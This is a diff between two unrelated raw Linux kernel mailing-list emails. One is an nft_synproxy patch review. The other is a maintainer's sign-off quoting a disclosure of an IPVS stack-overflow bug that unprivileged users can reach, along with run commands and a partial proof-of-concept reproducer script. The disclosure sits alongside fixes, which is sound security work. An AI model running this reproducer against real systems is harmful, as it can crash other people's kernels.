@@ -1,246 +1,985 @@
-Received: from smtp-out1.suse.de (smtp-out1.suse.de [195.135.223.130])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from mx.ssi.bg (mx.ssi.bg [193.238.174.39])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7560F4BFE85
-	for <netfilter-devel@vger.kernel.org>; Mon,  5 Oct 2026 15:23:18 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=195.135.223.130
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AD25A4AA56B;
+	Mon,  5 Oct 2026 15:33:58 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=193.238.174.39
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1791213800; cv=none; b=H56nyaElFQDfbtpHjieBptkPmu89Uo9U7kWiS1Xb711z0WpQ/Bvc+aJ0BtNN+7dDwi6+2Fhk5SyXy0+kouw33y/V+4j0Ioh8tUNomcXlory98evBuBoCFM3yE1rklKL1Yqu5tQe1H40La1XLiIgQ9cVixjcYsK5RhmLbtBXtqEs=
+	t=1791214444; cv=none; b=QULPJaQHhbt6+6My1SsPhi6MPLVGpWd9awkWcw4C/blYqhQSYfspWfGAsWjeXyc+ZYK9nGBlECre9AZ6KBMCcoLjBGWQDnyBvdVLXDSDfUhoGVGYBSGd8mMTLw92TxB4MYK9oW8FtcaAeWkHwCDuUCbt65/PmZHom1B6oVno9dU=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1791213800; c=relaxed/simple;
-	bh=RG1agnXLBjcZG441O6oFRZ0nobQwKmC/y9ELIPQfKAU=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=n0gLr9Cp1ZeHa9dDF0gq/WTrSok5ED14C1VdPWAqJzf4IuX+b6rf9rBTeShMNt10FS9WNyt7eGZscmZn67rwLyUEfRl9vrFFm2Y3Aql8raqeOO5tJLnYxmUTR1ZJILlfzVByXbyxI6PLV8TBXHDy+jvSpPgupwJ5dhizpWEd0Lw=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=suse.de; spf=pass smtp.mailfrom=suse.de; dkim=pass (1024-bit key) header.d=suse.de header.i=@suse.de header.b=ICPvJIG7; dkim=permerror (0-bit key) header.d=suse.de header.i=@suse.de header.b=PxGXBLY+; dkim=pass (1024-bit key) header.d=suse.de header.i=@suse.de header.b=nQ14j51C; dkim=permerror (0-bit key) header.d=suse.de header.i=@suse.de header.b=dIH+mpni; arc=none smtp.client-ip=195.135.223.130
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=suse.de
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=suse.de
+	s=arc-20240116; t=1791214444; c=relaxed/simple;
+	bh=PZvnWsHcRtGL7bMTHhH3arfhRSTyKdw/A11xkeSsbHg=;
+	h=Date:From:To:cc:Subject:In-Reply-To:Message-ID:References:
+	 MIME-Version:Content-Type; b=eUuHS80zEvKo3EkK0NdoOkmCaJ5Av5uXC0T1LIIWyxF6W4V6WYQ/TQjYua2+/bn4wG8hQojTYtrGzJSEV6ZcmSsrJ2IUloLzuxEfQNmOCoqgCho8lCmcODxlubZehcg7azFX3KQ4xn7xjePgS2Po8lxoekMQZIQIMQPba8x9VFA=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=ssi.bg; spf=pass smtp.mailfrom=ssi.bg; dkim=pass (4096-bit key) header.d=ssi.bg header.i=@ssi.bg header.b=hY5ReS1Q; arc=none smtp.client-ip=193.238.174.39
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=ssi.bg
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=ssi.bg
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=suse.de header.i=@suse.de header.b="ICPvJIG7";
-	dkim=permerror (0-bit key) header.d=suse.de header.i=@suse.de header.b="PxGXBLY+";
-	dkim=pass (1024-bit key) header.d=suse.de header.i=@suse.de header.b="nQ14j51C";
-	dkim=permerror (0-bit key) header.d=suse.de header.i=@suse.de header.b="dIH+mpni"
-Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org [IPv6:2a07:de40:b281:104:10:150:64:97])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
-	(No client certificate requested)
-	by smtp-out1.suse.de (Postfix) with ESMTPS id F122621DF8;
-	Mon,  5 Oct 2026 15:22:58 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
-	t=1791213783; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=TtWOvTzDhsbL+fnaDf7hn8RMABYqEKUGcMYsDWK0xRI=;
-	b=ICPvJIG77dMO7DopWY1BM9La9FdlEBUDQeFcPYoxCfs6HuSG7abOWe5348gYc8HU1LGFqP
-	IvmikGCMZfGZTOix/Go543ylzM6uzmtacvWJMuQh5KUlzxgyJnfscSHm+Vz7NiHM5t1KzV
-	XPJpgGABl5hKiryFx9UjbVfXraooeJc=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
-	s=susede2_ed25519; t=1791213783;
-	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=TtWOvTzDhsbL+fnaDf7hn8RMABYqEKUGcMYsDWK0xRI=;
-	b=PxGXBLY+sBw49+/lvxY+ac1W0bcl1OeDfPRV7JQZnHe2d2PuyKp15OGkKkaeKW1FBKpGln
-	0fffPRXB7yVMCnDw==
-Authentication-Results: smtp-out1.suse.de;
-	dkim=pass header.d=suse.de header.s=susede2_rsa header.b=nQ14j51C;
-	dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=dIH+mpni
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
-	t=1791213778; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=TtWOvTzDhsbL+fnaDf7hn8RMABYqEKUGcMYsDWK0xRI=;
-	b=nQ14j51CuWC/cIB0kruN6i6tB+xCe4/p2VcA2pEAwI27C4uME72yTEiD6b5mjr5kri6T2y
-	mOplc5c+c3wGZvJcJM3vKInjmQqChgIfExnCS2+aekuhXf6DxFquEaKssPYwmaD3TQnhst
-	oI0xY/ZLuG0dRgjwzD+DSgCnX0UZlPw=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
-	s=susede2_ed25519; t=1791213778;
-	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=TtWOvTzDhsbL+fnaDf7hn8RMABYqEKUGcMYsDWK0xRI=;
-	b=dIH+mpnih/qOlD7xtr2Ya64dfoFdMPpTCMGccl5mS91PRSFFZsqG8WFlNzVF7o5lKFg9J0
-	LIaIE0JdLogkveDg==
-Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
-	(No client certificate requested)
-	by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id C3EB213B06;
-	Mon,  5 Oct 2026 15:22:57 +0000 (UTC)
-Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
-	by imap1.dmz-prg2.suse.org with ESMTPSA
-	id xHu4JtHAw2oLbwAAD6G6ig
-	(envelope-from <fmancera@suse.de>); Mon, 05 Oct 2026 15:22:57 +0000
-Message-ID: <6af568ad-c487-49da-b087-fa0b600b247b@suse.de>
-Date: Mon, 5 Oct 2026 17:21:58 +0200
+	dkim=pass (4096-bit key) header.d=ssi.bg header.i=@ssi.bg header.b="hY5ReS1Q"
+Received: from mx.ssi.bg (localhost [127.0.0.1])
+	by mx.ssi.bg (Potsfix) with ESMTP id 25BF222651;
+	Mon, 05 Oct 2026 18:25:31 +0300 (EEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ssi.bg; h=cc:cc
+	:content-type:content-type:date:from:from:in-reply-to:message-id
+	:mime-version:references:reply-to:subject:subject:to:to; s=ssi;
+	 bh=yFIrYoObhG+/6aGFVx01Lu9qZvshHG6YcNoOQ8ShKFA=; b=hY5ReS1QLHms
+	0QQnYgefX7iEXPzliWjYVsPiqlFwOwnhn201HL39ut7jN9xhR7FA2URnyucOWbh3
+	ytmj9krpgIurjSEL5+HKS5bLEshNtPqSr3LKTS28PDo5duaLuGBS12EXJniL8rRM
+	ZmFb/jFU0kMVmmRuYFKnxhJACmMkfeEk0ltFGaw31VEpsuRUYUs1kICQTZ4dteO5
+	GNGnbdkm/wdG5o0CYhCXJUpuvjBl5EdLTQWiRjQ8sjxpRllzhF0eaFTzZ+4PN2T/
+	ll3Bz1gyICO4M+XxVvHnDtAYz7qSr9hfYQwPuS/kXIjZWa5+Wg501aedy30e6Psh
+	SacN55OwEYLfMaWEGKkUOAs8qjq76tv5hs6V9TPIecVK2bKbdn7UgSUNIZguvfL+
+	6kEM9CNdypk3iE/Fu/LV0M9jPEpal5IX026jpo0f6Fu+d01Zy8cKBh1yejigpni0
+	PSxKDrCXcf27ZpfrpmBUa9b0OABdlVA4ecsomhNd0XEz4vikDSQKhe+U+nXB6F8Z
+	Q67plb80okG+cIJiRVjywCtJQLiynDKnkagIwzPCs5VS2FeWd/ez7KFt3xok9nAQ
+	ldIF8lFQQpOdJ3Mb+LPXEP7+mw5rzRG3fMsDEtLZGU3ODZCTD+5JZjU/DQoHY/3p
+	APHwkx0f9gBlFqaP5m66AdA6r6KkLic=
+Received: from box.ssi.bg (box.ssi.bg [193.238.174.46])
+	by mx.ssi.bg (Potsfix) with ESMTPS;
+	Mon, 05 Oct 2026 18:25:30 +0300 (EEST)
+Received: from ja.ssi.bg (unknown [213.16.62.126])
+	by box.ssi.bg (Potsfix) with ESMTPSA id B2EA4608BA;
+	Mon,  5 Oct 2026 18:25:31 +0300 (EEST)
+Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
+	by ja.ssi.bg (8.18.2/8.18.2) with ESMTP id 695FPHe1056857;
+	Mon, 5 Oct 2026 18:25:18 +0300
+Date: Mon, 5 Oct 2026 18:25:17 +0300 (EEST)
+From: Julian Anastasov <ja@ssi.bg>
+To: Zihan Xi <zihanx@nebusec.ai>
+cc: lvs-devel@vger.kernel.org, netfilter-devel@vger.kernel.org,
+        dsahern@kernel.org, idosch@nvidia.com, horms@verge.net.au,
+        davem@davemloft.net, edumazet@kernel.org, pabeni@redhat.com,
+        pablo@netfilter.org, fw@strlen.de, phil@nwl.cc, vega@nebusec.ai,
+        root@tr0jan.top
+Subject: Re: [PATCH nf v6 0/3] ipvs: avoid stack overflow from recursive
+ connection expiration
+In-Reply-To: <cover.1791194172.git.zihanx@nebusec.ai>
+Message-ID: <f93d40f7-6e39-d96d-8215-92c90a263134@ssi.bg>
+References: <cover.1791194172.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netfilter-devel@vger.kernel.org
 List-Id: <netfilter-devel.vger.kernel.org>
 List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH nf-next v2] netfilter: nft_synproxy: only handle pure SYN
- and ACK packets
-To: Nguyen Ngoc Thang <ngocthang2710.1999@gmail.com>,
- Pablo Neira Ayuso <pablo@netfilter.org>, Florian Westphal <fw@strlen.de>
-Cc: Phil Sutter <phil@nwl.cc>,
- Fernando Fernandez Mancera <ffmancera@riseup.net>,
- "David S . Miller" <davem@davemloft.net>, Eric Dumazet
- <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
- Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>,
- netfilter-devel@vger.kernel.org, coreteam@netfilter.org,
- netdev@vger.kernel.org, linux-kernel@vger.kernel.org,
- syzbot+d7795c8487ca4e20ed88@syzkaller.appspotmail.com,
- syzbot+d0d2f1a65f45b319d25d@syzkaller.appspotmail.com,
- syzkaller-bugs@googlegroups.com
-References: <20261004160615.142456-1-ngocthang2710.1999@gmail.com>
- <20261005151257.9128-1-ngocthang2710.1999@gmail.com>
-Content-Language: en-US
-From: Fernando Fernandez Mancera <fmancera@suse.de>
-In-Reply-To: <20261005151257.9128-1-ngocthang2710.1999@gmail.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
-X-Spamd-Result: default: False [-3.01 / 50.00];
-	BAYES_HAM(-3.00)[100.00%];
-	SUSPICIOUS_RECIPS(1.50)[];
-	NEURAL_HAM_LONG(-1.00)[-1.000];
-	R_DKIM_ALLOW(-0.20)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
-	NEURAL_HAM_SHORT(-0.20)[-1.000];
-	MIME_GOOD(-0.10)[text/plain];
-	MX_GOOD(-0.01)[];
-	MIME_TRACE(0.00)[0:+];
-	RCPT_COUNT_TWELVE(0.00)[17];
-	FREEMAIL_TO(0.00)[gmail.com,netfilter.org,strlen.de];
-	ARC_NA(0.00)[];
-	RCVD_TLS_ALL(0.00)[];
-	RBL_SPAMHAUS_BLOCKED_OPENRESOLVER(0.00)[2a07:de40:b281:104:10:150:64:97:from];
-	DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
-	DKIM_TRACE(0.00)[suse.de:+];
-	FREEMAIL_ENVRCPT(0.00)[gmail.com];
-	RCVD_VIA_SMTP_AUTH(0.00)[];
-	SPAMHAUS_XBL(0.00)[2a07:de40:b281:104:10:150:64:97:from];
-	RCVD_COUNT_TWO(0.00)[2];
-	FROM_EQ_ENVFROM(0.00)[];
-	FROM_HAS_DN(0.00)[];
-	TO_DN_SOME(0.00)[];
-	TO_MATCH_ENVRCPT_SOME(0.00)[];
-	MID_RHS_MATCH_FROM(0.00)[];
-	DNSWL_BLOCKED(0.00)[2a07:de40:b281:106:10:150:64:167:received];
-	TAGGED_RCPT(0.00)[d0d2f1a65f45b319d25d,d7795c8487ca4e20ed88];
-	RECEIVED_SPAMHAUS_BLOCKED_OPENRESOLVER(0.00)[2a07:de40:b281:106:10:150:64:167:received];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo,imap1.dmz-prg2.suse.org:rdns,appspotmail.com:email,suse.de:dkim,suse.de:email,suse.de:mid,syzkaller.appspot.com:url]
-X-Spam-Score: -3.01
-X-Spam-Level: 
-X-Rspamd-Action: no action
-X-Rspamd-Queue-Id: F122621DF8
-X-Rspamd-Server: rspamd1.dmz-prg2.suse.org
-X-Spam-Flag: NO
+Content-Type: text/plain; charset=US-ASCII
 
-On 10/5/26 5:12 PM, Nguyen Ngoc Thang wrote:
-> nft_synproxy treats any segment with SYN set as a client's initial SYN
-> and any segment with ACK set as the client's final ACK. A SYN-ACK thus
-> gets answered with a fresh SYN-ACK cookie.
-> 
-> If that reply is routed back to the same host, e.g. to a peer address
-> covered by an address on lo, it re-enters the input hook, is answered
-> again, and never stops. Every such SYN starts its own endless loop over
-> the loopback backlog, so NET_RX softirq keeps the CPU busy and memory
-> fills with skbs and rtable entries until workqueues stall and the
-> machine OOMs.
-> 
-> Use the same flag checks as ip(6)t_SYNPROXY: SYN without ACK, FIN or
-> RST is an initial SYN; ACK without SYN, FIN or RST is the client ACK.
-> Anything else falls through to the next expression.
-> 
-> Reported-by: syzbot+d7795c8487ca4e20ed88@syzkaller.appspotmail.com
-> Closes: https://syzkaller.appspot.com/bug?extid=d7795c8487ca4e20ed88
-> Reported-by: syzbot+d0d2f1a65f45b319d25d@syzkaller.appspotmail.com
-> Closes: https://syzkaller.appspot.com/bug?extid=d0d2f1a65f45b319d25d
-> Signed-off-by: Nguyen Ngoc Thang <ngocthang2710.1999@gmail.com>
-> ---
-> v2:
-> - Retarget to nf-next (Pablo).
-> - Drop the Fixes: tag accordingly.
 
-This should have been sent as a standalone thread not as a reply under 
-the v1. In any case, I agree with the patch.
+	Hello,
 
-Reviewed-by: Fernando Fernandez Mancera <fmancera@suse.de>
+On Mon, 5 Oct 2026, Zihan Xi wrote:
 
+> Hi Linux kernel maintainers,
 > 
-> v1: https://lore.kernel.org/all/20261004160615.142456-1-ngocthang2710.1999@gmail.com/
+> We found and validated a issue in
+> net/netfilter/ipvs/ip_vs_ftp.c and net/netfilter/ipvs/ip_vs_conn.c. The
+> bug is reachable by a non-root user via user and net namespace.
+> We've tested it, and it should not affect any other functionality.
 > 
-> Notes (not for the changelog):
+> This series contains 3 patches:
 > 
-> Reproduced in QEMU (x86_64, 2 vCPUs, KASAN+lockdep) with syzbot's C
-> repro for d7795c8487ca4e20ed88. Minimised: only the nft batch and the
-> injected SYN matter, which is exactly the d0d2f1a65f45b319d25d program.
+>   1/3 Fix problems during IPVS connection deletion.
+>   2/3 Replace recursive controller expiration with an iterative cleanup
+>       path.
+>   3/3 Reject zero and configured FTP control ports as data ports.
+
+	The patchset looks good to me. Thank you Zihan!
+
+	Patch 1 already has my SOB line, so this is also
+for patch 2 and 3:
+
+Signed-off-by: Julian Anastasov <ja@ssi.bg>
+
+> We will provide detailed information about the bug
+> in this email, along with PoCs to trigger it.
 > 
-> The rule is an inet table, base chain on input, with an unconditional
-> "synproxy" expression. The SYN goes from 172.20.20.187 to .170 via tun;
-> syzkaller puts 172.20.20.10/24 on lo, so the whole /24 is local and the
-> SYN-ACK cookie comes back through lo. Instrumented trace:
+> ---- details below ----
 > 
->    synproxy tx .170->.187 in=syz_tun out=lo syn=1 ack=1
->    synproxy tx .187->.170 in=lo      out=lo syn=1 ack=1
->    synproxy tx .170->.187 in=lo      out=lo syn=1 ack=1
->    ...
+> Bug details:
 > 
-> Before (3fd2ff60f6d6, full C repro):
->    - synproxy syn_received ~400k per CPU per netns after 15s
->    - rtable 80k -> 295k, skbuff_head_cache >1M, softirq time explodes
->    - "BUG: workqueue lockup", then OOM / hung task, VM wedges
+> The trigger entry point is ip_vs_ftp_out() in
+> net/netfilter/ipvs/ip_vs_ftp.c. It parses a PASV or EPSV reply from the
+> real server and creates a wildcard data connection from the advertised
+> port. The baseline reproducer uses port 21, the default FTP control
+> port. ip_vs_conn_new() then binds the FTP helper to the new connection
+> again. Because the child has IP_VS_CONN_F_NO_CPORT, the next connection
+> from the same client to the VIP on port 21 matches the wildcard child
+> instead of creating a new top-level entry. Repeating the FTP exchange
+> builds a chain of controlled connections.
 > 
-> After (2 runs x 300s, full C repro):
->    - no lockup, hung task or OOM
->    - rtable flat (~2.2k), skbuff_head_cache flat (~80k)
->    - syn_received grows slowly (~9.5k/300s): real SYNs still answered
+> The active-mode entry point, ip_vs_ftp_in(), has the same chain-building
+> condition when the derived data port is a configured control port. The
+> data connection's virtual port is derived from cp->vport - 1. With
+> ports={21,20}, the derived port is 20, so ip_vs_conn_new() can bind the
+> FTP helper again.
 > 
-> ACK|FIN and ACK|RST no longer hit the cookie check (and its NF_DROP);
-> they continue, as with ip(6)t_SYNPROXY's XT_CONTINUE. The usual
-> "ct state invalid drop" rule still catches them.
+> The FTP entry points are in ip_vs_ftp.c, but the stack-overflow root
+> cause is in the generic cleanup path in ip_vs_conn.c. When a controlled
+> connection expires, ip_vs_conn_expire() can delete and expire its
+> controller. The old path can then call ip_vs_conn_expire() recursively.
+> A long controlled-connection chain can exhaust the kernel stack. The
+> reproduced failure occurs during network namespace teardown, but the
+> cleanup bug is in the generic controller-chain path, not a teardown-only
+> special case.
 > 
->   net/netfilter/nft_synproxy.c | 8 ++++----
->   1 file changed, 4 insertions(+), 4 deletions(-)
+> Patch 1 fixes the connection lifetime race by making the refcount account
+> for active users and the pending or running timer. The deletion path can
+> steal the pending timer reference, and controller-chain deletion is
+> protected by RCU. The expiration path no longer relies on a separate
+> timer_delete() after the reference handoff.
 > 
-> diff --git a/net/netfilter/nft_synproxy.c b/net/netfilter/nft_synproxy.c
-> index 9ed288c9d168..a580cb7324da 100644
-> --- a/net/netfilter/nft_synproxy.c
-> +++ b/net/netfilter/nft_synproxy.c
-> @@ -53,13 +53,13 @@ static void nft_synproxy_eval_v4(const struct nft_synproxy *priv,
->   	struct synproxy_net *snet = synproxy_pernet(net);
->   	struct sk_buff *skb = pkt->skb;
->   
-> -	if (tcp->syn) {
-> +	if (tcp->syn && !(tcp->ack || tcp->fin || tcp->rst)) {
->   		/* Initial SYN from client */
->   		nft_synproxy_tcp_options(opts, tcp, snet, &info);
->   		synproxy_send_client_synack(net, skb, tcp, opts);
->   		consume_skb(skb);
->   		regs->verdict.code = NF_STOLEN;
-> -	} else if (tcp->ack) {
-> +	} else if (tcp->ack && !(tcp->fin || tcp->rst || tcp->syn)) {
->   		/* ACK from client */
->   		if (synproxy_recv_client_ack(net, skb, tcp, opts,
->   					     ntohl(tcp->seq))) {
-> @@ -84,13 +84,13 @@ static void nft_synproxy_eval_v6(const struct nft_synproxy *priv,
->   	struct synproxy_net *snet = synproxy_pernet(net);
->   	struct sk_buff *skb = pkt->skb;
->   
-> -	if (tcp->syn) {
-> +	if (tcp->syn && !(tcp->ack || tcp->fin || tcp->rst)) {
->   		/* Initial SYN from client */
->   		nft_synproxy_tcp_options(opts, tcp, snet, &info);
->   		synproxy_send_client_synack_ipv6(net, skb, tcp, opts);
->   		consume_skb(skb);
->   		regs->verdict.code = NF_STOLEN;
-> -	} else if (tcp->ack) {
-> +	} else if (tcp->ack && !(tcp->fin || tcp->rst || tcp->syn)) {
->   		/* ACK from client */
->   		if (synproxy_recv_client_ack_ipv6(net, skb, tcp, opts,
->   						  ntohl(tcp->seq))) {
+> Patch 2 continues expiration with the controller after the current
+> connection has been fully cleaned up instead of recursively calling the
+> expiration path. The cleanup remains synchronous while using one stack
+> frame for the whole chain. It uses the connection-deletion fix from patch
+> 1 for the controller handoff.
+> 
+> Patch 3 rejects zero and configured FTP control ports before creating
+> passive data connections in ip_vs_ftp_out(), covering both PASV and EPSV.
+> It also rejects a zero active-mode client port and a data port derived
+> from a configured control port in ip_vs_ftp_in(). Valid data ports
+> continue through the existing path.
+> 
+> The recursive-cleanup root cause was introduced by
+> f9200a52eedf ("ipvs: avoid expiring many connections from timer"). The FTP
+> helper's acceptance of a control port is a separate root-cause fact,
+> introduced by 1da177e4c3f4 ("Linux-2.6.12-rc2"). These are different
+> root-cause facts, so the fixes use separate Fixes: tags.
+> 
+> Reproducer:
+> 
+> The reproducers are shell scripts with embedded Python and do not
+> require compilation. The baseline reproducer was run as follows:
+> 
+>     SELF_UNSHARE=1 MODE=exit ./poc-original.sh 400
+> 
+> The v6 connection-cleanup validation was run as follows:
+> 
+>     SELF_UNSHARE=1 MODE=exit ./poc-original.sh 200
+> 
+> The passive-mode validation was run as follows:
+> 
+>     SELF_UNSHARE=1 MODE=exit ./poc.sh 200
+> 
+> The active-mode validation used the following kernel parameter and
+> command:
+> 
+>     ip_vs_ftp.ports=21,20
+>     SELF_UNSHARE=1 MODE=exit ./poc-active.sh 1
+> 
+> packetdrill was not used because the trigger requires namespace creation,
+> the legacy IPVS sockopt ABI, a cooperating TCP server, and namespace
+> teardown. packetdrill cannot express that complete control-plane setup
+> and lifetime on its own.
+> 
+> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+> 
+> The original baseline crash was collected on 70194dc37670
+> (7.3.0-rc2-g70194dc37670). The v6 series is based on nf/HEAD
+> 9c572a83037a. The crash log below is retained as original trigger
+> evidence; it is not presented as a validation run on the v6 baseline.
+> 
+> The v6 connection-cleanup validation created 200 connections and 201
+> IPVS entries, completed namespace teardown, and reported no KASAN, BUG,
+> Oops, panic, stack-guard, general-protection, or refcount diagnostic.
+> The passive FTP validation rejected 200/200 control-port replies, kept
+> 200 IPVS entries, and created zero passive data connections. The active
+> FTP validation ran with DEPTH=1 (one FTP control connection), reported
+> one IPVS entry before namespace teardown, and created zero derived data
+> connections. Both validation runs completed namespace teardown without
+> the listed kernel diagnostics.
+> 
+> The crash excerpt below is copied from the decoded baseline report.
+> Unrelated boot output, registers, disassembly, and local execution
+> paths are omitted.
+> 
+> Reproducer source files:
+> 
+> ------BEGIN poc-original.sh------
+> #!/bin/sh
+> set -eu
+> 
+> DEPTH="${1:-400}"
+> MODE="${MODE:-exit}"
+> SELF_UNSHARE="${SELF_UNSHARE:-0}"
+> 
+> if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
+> 	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
+> 		unshare -Urn -- "$0" "${DEPTH}"
+> fi
+> 
+> ulimit -n 65535 2>/dev/null || true
+> 
+> IP=/usr/sbin/ip
+> PYTHON=/usr/bin/python3
+> 
+> VIP=198.51.100.1
+> REAL=198.51.100.2
+> CLIENT=198.51.100.3
+> PORT=21
+> 
+> "${IP}" link set lo up
+> "${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
+> "${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
+> "${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true
+> 
+> exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
+> import ctypes
+> import os
+> import socket
+> import sys
+> import threading
+> import time
+> 
+> depth = int(sys.argv[1])
+> mode = sys.argv[2]
+> vip = sys.argv[3]
+> real = sys.argv[4]
+> client_ip = sys.argv[5]
+> port = int(sys.argv[6])
+> 
+> ready = threading.Event()
+> server_error = []
+> client_error = []
+> accepted = []
+> clients = []
+> 
+> IP_VS_BASE_CTL = 64 + 1024 + 64
+> IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
+> IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
+> IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7
+> 
+> 
+> class Svc(ctypes.Structure):
+>     _fields_ = [
+>         ("protocol", ctypes.c_uint16),
+>         ("addr", ctypes.c_uint32),
+>         ("port", ctypes.c_uint16),
+>         ("fwmark", ctypes.c_uint32),
+>         ("sched_name", ctypes.c_char * 16),
+>         ("flags", ctypes.c_uint),
+>         ("timeout", ctypes.c_uint),
+>         ("netmask", ctypes.c_uint32),
+>     ]
+> 
+> 
+> class Dest(ctypes.Structure):
+>     _fields_ = [
+>         ("addr", ctypes.c_uint32),
+>         ("port", ctypes.c_uint16),
+>         ("conn_flags", ctypes.c_uint),
+>         ("weight", ctypes.c_int),
+>         ("u_threshold", ctypes.c_uint32),
+>         ("l_threshold", ctypes.c_uint32),
+>     ]
+> 
+> 
+> def native_u32(ip):
+>     return int.from_bytes(socket.inet_aton(ip), sys.byteorder)
+> 
+> 
+> def ipvs_sock():
+>     return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+> 
+> 
+> def ipvs_flush():
+>     s = ipvs_sock()
+>     try:
+>         s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
+>     finally:
+>         s.close()
+> 
+> 
+> def ipvs_add_service():
+>     svc = Svc()
+>     svc.protocol = socket.IPPROTO_TCP
+>     svc.addr = native_u32(vip)
+>     svc.port = socket.htons(port)
+>     svc.fwmark = 0
+>     svc.sched_name = b"rr"
+>     svc.flags = 0
+>     svc.timeout = 0
+>     svc.netmask = 0
+> 
+>     s = ipvs_sock()
+>     try:
+>         s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
+>     finally:
+>         s.close()
+>     return svc
+> 
+> 
+> def ipvs_add_dest(svc):
+>     dest = Dest()
+>     dest.addr = native_u32(real)
+>     dest.port = socket.htons(port)
+>     dest.conn_flags = 0
+>     dest.weight = 1
+>     dest.u_threshold = 0
+>     dest.l_threshold = 0
+> 
+>     s = ipvs_sock()
+>     try:
+>         s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
+>     finally:
+>         s.close()
+> 
+> 
+> def recv_line(sock):
+>     data = bytearray()
+>     while not data.endswith(b"\n"):
+>         chunk = sock.recv(1)
+>         if not chunk:
+>             raise RuntimeError("unexpected EOF")
+>         data.extend(chunk)
+>     return bytes(data)
+> 
+> 
+> def server():
+>     try:
+>         srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>         srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+>         srv.bind((real, port))
+>         srv.listen(depth + 16)
+>         ready.set()
+>         for i in range(depth):
